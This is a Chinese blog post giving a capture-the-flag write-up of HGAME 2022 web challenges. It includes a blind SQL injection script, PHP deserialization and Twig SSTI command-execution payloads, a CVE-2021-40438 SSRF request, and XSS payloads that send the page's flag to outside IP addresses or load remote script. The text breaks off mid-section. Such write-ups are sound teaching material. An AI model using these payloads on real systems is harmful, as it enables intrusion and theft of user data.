<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>



<link rel="canonical" href="http://example.com/2023/12/25/HGAME%202022%20WEB/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/HGAME%202022%20WEB/","path":"2023/12/25/HGAME 2022 WEB/","title":"HGAME 2022 WEB"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HGAME 2022 WEB | Y0ng's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Y0ng's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tetris-plus"><span class="nav-text">Tetris plus</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Fujiwara-Tofu-Shop"><span class="nav-text">Fujiwara Tofu Shop</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%9B%9B%E8%9B%9B%E2%80%A6%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B"><span class="nav-text">蛛蛛…嘿嘿♥我的蛛蛛</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-auth"><span class="nav-text">easy_auth</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#webpack-engine"><span class="nav-text">webpack-engine</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E6%9C%AC%E5%8D%95%E8%AF%8D%E4%B9%A6"><span class="nav-text">一本单词书</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Apache"><span class="nav-text">Apache!</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pokemon"><span class="nav-text">Pokemon</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#At0m%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF"><span class="nav-text">At0m的留言板</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Vidar-shop-demo"><span class="nav-text">Vidar shop demo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SecurityCenter"><span class="nav-text">SecurityCenter</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LoginMe"><span class="nav-text">LoginMe</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Markdown-Online"><span class="nav-text">Markdown Online</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Comment"><span class="nav-text">Comment</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FileSystem"><span class="nav-text">FileSystem</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Y0ng</p>
  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/HGAME%202022%20WEB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Y0ng">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Y0ng's Blog">
      <meta itemprop="description" content="花有重开日，人无再少年">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HGAME 2022 WEB | Y0ng's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HGAME 2022 WEB
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>web篇</p>
<a id="more"></a>

<h1 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris plus"></a>Tetris plus</h1><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/2332d271e43d4cb196db39ac537489d1.png"><br>直接搜索alert</p>
<h1 id="Fujiwara-Tofu-Shop"><a href="#Fujiwara-Tofu-Shop" class="headerlink" title="Fujiwara Tofu Shop"></a>Fujiwara Tofu Shop</h1><p>添加一些头部信息，<strong>X-Real-IP: 127.0.0.1</strong></p>
<h1 id="蛛蛛…嘿嘿♥我的蛛蛛"><a href="#蛛蛛…嘿嘿♥我的蛛蛛" class="headerlink" title="蛛蛛…嘿嘿♥我的蛛蛛"></a>蛛蛛…嘿嘿♥我的蛛蛛</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://hgame-spider.vidar.club/be26bf4bdf&#x27;</span></span><br><span class="line">r = requests.get(url).text</span><br><span class="line">htmltxt = etree.HTML(r)</span><br><span class="line">key = htmltxt.xpath(<span class="string">&quot;//a/@href&quot;</span>)</span><br><span class="line">Key = <span class="string">&#x27;&#x27;</span>.join(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">110</span>):</span><br><span class="line">    print(url+Key)</span><br><span class="line">    r = requests.get(url+Key).text</span><br><span class="line">    htmltxt = etree.HTML(r)</span><br><span class="line">    key = htmltxt.xpath(<span class="string">&quot;//a/@href&quot;</span>)</span><br><span class="line">    Key = <span class="string">&#x27;&#x27;</span>.join(key)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;game&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">&quot;success!&quot;</span>+r)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>第100个包，头部信息</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/f69afd537d074c529e5442617a5f42ce.png"></p>
<h1 id="easy-auth"><a href="#easy-auth" class="headerlink" title="easy_auth"></a>easy_auth</h1><p>jwt没密钥直接换0</p>
<h1 id="webpack-engine"><a href="#webpack-engine" class="headerlink" title="webpack-engine"></a>webpack-engine</h1><p>Webpack打包网站，细心点搜一下源码</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/f7199f6d21684d2e8f8392fe74983529.png"><br>Flag: hgame{D0nt_f0r9et_2_ClOs3_S0urce_m@p}</p>
<h1 id="一本单词书"><a href="#一本单词书" class="headerlink" title="一本单词书"></a>一本单词书</h1><p>username=adm1n&amp;password=1080a 弱比较绕过登录</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/545c000ff8014be195544f2d2f083f31.png"></p>
<p>save.php可以操作session文件</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/d3b8d4582ffd40a58cc15936013ad7f2.png"></p>
<p>get.php可以反序列化</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/5dc8322d49c548309e362a7cf25ef409.png"></p>
<p>由于数据处理时为 <strong>json_decode</strong> 所以 <strong>键值对的键可控</strong>，注入session文件，反序列化读取文件<br>Payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;y0ng|O:4:\&quot;Evil\&quot;:2:&#123;s:4:\&quot;file\&quot;;s:5:\&quot;&#x2F;flag\&quot;;s:4:\&quot;flag\&quot;;N;&#125;&quot;:1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>访问get.php触发反序列化</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/849f44eb876e41808548fdd503f97c9d.png"></p>
<p>Flag：hgame{Uns@f3_D3seR1@liz4t1On!Is~h0rr1b1e-!n_PhP}</p>
<h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache!"></a>Apache!</h1><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/591bad95337b44ab9466d9aacd5f3bf0.png"></p>
<p>附件 Default.conf 发现 flag路径</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/b451702c8a48443f827f39a22e8cdc10.png"></p>
<p>搜索相关cve，2021 年 Apache 的 mod_proxy 模块报了个 SSRF 漏洞（CVE-2021-40438），<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/257657">Apache httpd Server CVE-2021-40438 漏洞分析</a>， 用来ssrf探测内网，这题设置了 <strong>/proxy的代理服务</strong></p>
<p>Payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;proxy?unix:A*6409|http:&#x2F;&#x2F;127.0.0.1:60010&#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8787</span><br><span class="line">User-Agent: curl&#x2F;7.64.1</span><br><span class="line">Accept: *&#x2F;*</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/e155777b6d6742de842e8f56321e78c7.png"></p>
<p>Flag：hgame{COng@tul4ti0n~u_r3prOduced_CVE-2021-40438}</p>
<h1 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h1><p>error.php二分法盲注，过滤 <strong>=</strong> 用 <strong>like</strong>绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://121.43.141.153:60056/error.php?code=&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (head &lt; tail):</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr(database(),%d,1))&gt;%d,404,403)&quot; % (i , mid)</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((selselectect/*/**/*/flag/*/**/*/frfromom/*/**/*/fllllllllaaaaaag),%d,1))&gt;%d,404,403)&quot;</span> % (i, mid)</span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr((selselectect/*/**/*/group_concat(column_name)frfromom(infoorrmation_schema.columns)whwhereere(table_name/*/**/*/like/*/**/*/&#x27;fllllllllaaaaaag&#x27;)),%d,1))&gt;%d,404,403)&quot; % (i, mid)</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="comment">#r.encoding = &quot;utf-8&quot;</span></span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;404&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    last = result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<p>Flag：hgame{C0n9r@tul4tiOn#Y0u$4r3_sq1_M4ST3R^}</p>
<h1 id="At0m的留言板"><a href="#At0m的留言板" class="headerlink" title="At0m的留言板"></a>At0m的留言板</h1><ul>
<li>xss</li>
</ul>
<p>给了一个html模板，发现flag在 <code>&lt;head&gt;</code> 标签中被定义</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/e1fc42e104514677929a03bf0c68cb9c.png"></p>
<p>题目环境是在微信平台，发送paylaod会返回代码执行的截图，禁用了一些常见xss，本来思路是让flag回显到平台，然后得到截图就行了，但是可能是截图太快，或者其他原因，不回显，所以只能外带数据</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/0b31b173ed8146ebac0a6c3f34c6d0a3.png"></p>
<p>以下是部分测试payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;&#x2F;span&gt;&lt;img src&#x3D;”111” onerror&#x3D;alert(1)&gt;&lt;span&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;span&gt;&lt;a onload&#x3D;&quot;document.location&#x3D;&#39;http\:&#x2F;&#x2F;150.158.181.145:8000&#x2F;?&#39;+flag;&quot;&gt;xss link\&lt;&#x2F;a&gt;&lt;span&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAYElEQVRIiWNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs&#x2F;PliAgYHBc143k&#x2F;yPi9t+X9N9qif38ePJv1&#x2F;vBnyyMDBj2bln&#x2F;dk9G84yjIJRMApGwSgYBaNgFIyCUTAKhg0AAIGyGwIHeA0MAAAAAElFTkSuQmCC&quot; onload&#x3D;&quot;window.open(&#39;http\:&#x2F;&#x2F;150.158.181.145:8000&#x2F;?&#39;+flag);&quot; width&#x3D;&quot;336&quot; height&#x3D;&quot;36&quot;&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&lt;span id&#x3D;&quot;msg&quot;&gt;&lt;video src&#x3D;&quot;111&quot; onerror&#x3D;&quot;document.getElementById(&#39;msg&#39;).innerHTML&#x3D;flag;&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;span id&#x3D;&quot;msg&quot;&gt;&lt;audio controls onloadeddate&#x3D;&quot;document.getElementById(&#39;msg&#39;).innerHTML&#x3D;flag;&quot;&gt;&lt;source src&#x3D;https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;i&#x2F;horse.mp3 type&#x3D;&quot;audio&#x2F;mpeg&quot;&gt;&lt;&#x2F;audio&gt;&lt;&#x2F;span&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;span id&#x3D;&quot;msg&quot;&gt;&lt;audio controls oncanplay&#x3D;&quot;document.getElementById(&#39;msg&#39;).innerHTML&#x3D;flag;&quot;&gt;&lt;source src&#x3D;&quot;https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;i&#x2F;horse.mp3&quot; type&#x3D;&quot;audio&#x2F;mpeg&quot;&gt;&lt;&#x2F;audio&gt;&lt;&#x2F;span&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;document.body.appendChild(document.createElement(&#39;script&#39;)).src&#x3D;&#39;http:&#x2F;&#x2F;1.116.110.61:8000&#x2F;1.js&#39;&gt;&lt;audio controls oncanplay&#x3D;&quot;haiCoder()&quot;&gt;&lt;source src&#x3D;&quot;https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;i&#x2F;horse.mp3&quot; type&#x3D;&quot;audio&#x2F;mpeg&quot;&gt;&lt;&#x2F;audio&gt;</span><br></pre></td></tr></table></figure>

<p>然后就是 <strong>利用img的src获取script中的数据然后外带数据</strong></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;1.116.110.61&#x2F;&#39;+document.getElementsByTagName(&#39;head&#39;)[0].getElementsByTagName(&#39;script&#39;)[0].text)&quot; width&#x3D;&quot;336&quot; height&#x3D;&quot;36&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;document.body.appendChild(document.createElement(&#39;script&#39;)).src&#x3D;&#39;http:&#x2F;&#x2F;1.116.110.61&#x2F;&#39;+document.getElementsByTagName(&#39;head&#39;)[0].getElementsByTagName(&#39;script&#39;)[0].text&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/45ef44b569d64da5a408103da766cce9.png"></p>
<p>Flag：hgame{Xs5_1s_so_int3Restin9!Var_is_0uT_of_d4te}</p>
<p>wp解法：</p>
<p>本题设计的思路是 <strong>获取到全局的变量名</strong>，然后找到 flag 的变量名再拿到 flag。</p>
<p>这也是模板html的提示点：为什么同样是两个变量，第一个使用 <strong>let</strong>，而第二个使用 <strong>var</strong> 呢？因为 <strong>使用 var 可<br>以利用 Object.keys(window) 拿到全局变量 flag 的变量名</strong>，而使用let的话无法获取。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&quot;document.getElementsByClassName(&#39;content&#39;)[0].innerText&#x3D;Object.keys(window)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/7979a93d746643ffa4b1a9bdc2b792b0.png"><br>再用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&quot;document.getElementsByClassName(&#39;content&#39;)[0].innerText &#x3D;F149_is_Here&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>总结：<br>由于我对于html返回对象那里基础薄弱，所以在找html中的script标签时费了很大力气然后就是在控制台进行测试</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/03e19e50d5a342df976f656bd7b956c8.png"></p>
<p>慢慢的找出对应的节点，获取文本<br>知识点：</p>
<ol>
<li>   <code>var elements = document.getElementsByTagName(name);</code>  返回集合</li>
<li>   <code>getElementsByTagName(&#39;script&#39;)</code> 在寻找标签为script的节点</li>
</ol>
<p>相关文章</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sfsec/p/15178028.html">XSS过滤绕过总结 - 随风kali - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.shuzhiduo.com/A/obzbDMk35E/">XSS漏洞之加载远程js文件</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bingogo/p/12108709.html">XSS漏洞之加载远程js文件</a></p>
<p><a target="_blank" rel="noopener" href="https://javascript.ruanyifeng.com/dom/document.html#toc13">document对象</a></p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement">HTMLElement</a></p>
<p><a target="_blank" rel="noopener" href="https://yaofeifly.github.io/2020/12/10/XSS_ByPass/">工作中梳理XSS Bypass WAF相关Payload - Fly 我是小灰灰 (yaofeifly.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247549869&idx=1&sn=11c8a8de90e1d5bd4f9504416e3795da&chksm=ebea4a80dc9dc396ae77508e5ac5b6ef4d4da042f592f9a0d3698316c34ecf2ed3c1b8cb0c51&mpshare=1&scene=23&srcid=0128pIF4Jdm8ASryr9umxi6O&sharer_sharetime=1643305494735&sharer_shareid=724519d4f4399658e85da9d6a9988d62#rd">xss绕waf几种姿势剖析 (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU2NzY5MzI5Ng==&mid=2247487273&idx=1&sn=e8606277429bda5b5ae21609445f612f&chksm=fc9815b6cbef9ca0ed827bf0502af7c1b56914ab89c15da2bd49ef3d66d29d1738b2b8d82f3e&mpshare=1&scene=23&srcid=1114GFQNDxsSe6oxUqJOC7Tc&sharer_sharetime=1643296076233&sharer_shareid=724519d4f4399658e85da9d6a9988d62#rd">Bypass XSS SQL Payload大全 (qq.com)</a></p>
<h1 id="Vidar-shop-demo"><a href="#Vidar-shop-demo" class="headerlink" title="Vidar shop demo"></a>Vidar shop demo</h1><p>注册用户然后发现账户有9999元，商店里面flag需要1w</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/ac69f3530ad64ae1b4bf0178147504bf.png"></p>
<p>应该就是逻辑漏洞或者竞争，点击flag商品和其他一个商品进行下单，先把40的支付一下</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/8de7fca4301c407192c90f09eef0e3e1.png"></p>
<p>发现点击删除按钮后会取消订单，退还钱，抓包看看</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/3081789b13d14ea89815542e6e850b53.png"></p>
<p>发现当点击删除时，发起一个对应ID的包，将id改为flag对应id 2637放包发现退还了1w，再次购买flag，成功</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/3bb990c5d47d47ac81c5fa5e7d62e8c7.png"></p>
<p>Flag：hgame{8f8ddb3537b037a296a85e920d54f650b4a6cc73b015ac0bdb91a579a193aa71}</p>
<h1 id="SecurityCenter"><a href="#SecurityCenter" class="headerlink" title="SecurityCenter"></a>SecurityCenter</h1><ul>
<li>Twig SSTI</li>
</ul>
<p>发现泄露 <strong>/vendor/composer/installed.json</strong>，使用了twig的框架，发现一个疑似ssrf地方</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/ee2a31135f1e458cba2597d1ce0ee94d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_17,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
<p>经过测试存在SSTI</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/01a0a91f81a64e9f8aa7ca1344224bf1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_17,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518">TWIG 全版本通用 SSTI payloads</a></p>
<p>Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;id&quot;,%200]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[%22base64+&#x2F;f*%22,%200]|sort(%22system%22)|join(%22,%22)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>FLAG: hgame{!Tw19-S5t11s^s00O0O_inter3st1n5~!}</p>
<h1 id="LoginMe"><a href="#LoginMe" class="headerlink" title="LoginMe"></a>LoginMe</h1><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/7b724e1a56b340a3a26c24d4471f35af.png"></p>
<p>Sqlmap直接跑出来了。。。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -r c:\Users\cys\Desktop\sql.txt --batch --random-agent -T uuussseeerrrsss -C password --dump –flush</span><br></pre></td></tr></table></figure>
<p>登录得flag</p>
<p>FLAG: hgame{d0490213241f3f29f172c475e1641a7d37bf2b8208616c4d4489aa58a1ebaeb4}</p>
<h1 id="Markdown-Online"><a href="#Markdown-Online" class="headerlink" title="Markdown Online"></a>Markdown Online</h1><p>学习到了<code>markdown xss</code> <code>nodejs vm逃逸</code> 过滤</p>
<p>先看导入了什么，<strong>markdown-it</strong> 与 <strong>zombie</strong></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/ccaa9f10262f4024ab2ad0c2e6b4eee4.png#pic_center"></p>
<p><strong>Zombie存在一个沙箱逃逸的rce漏洞</strong>，找到了出题人之前写过的一篇文章，与祥云杯的 cralwer_z 类似</p>
<p><a target="_blank" rel="noopener" href="https://blog.summ3r.top/2021/08/26/Nodejs-Zoombie-Package-RCE-%E5%88%86%E6%9E%90/">Nodejs Zoombie Package RCE 分析</a></p>
<p>看一下登录控制器，密码转换为大写后要与54g相等，这是不可能的</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/951e85cb852a43b99d49d0e6fd68fd93.png"></p>
<p>登录处只要让 toUpperCase 抛出异常就可以登陆成功，让password为数组即可使其长度为16绕过</p>
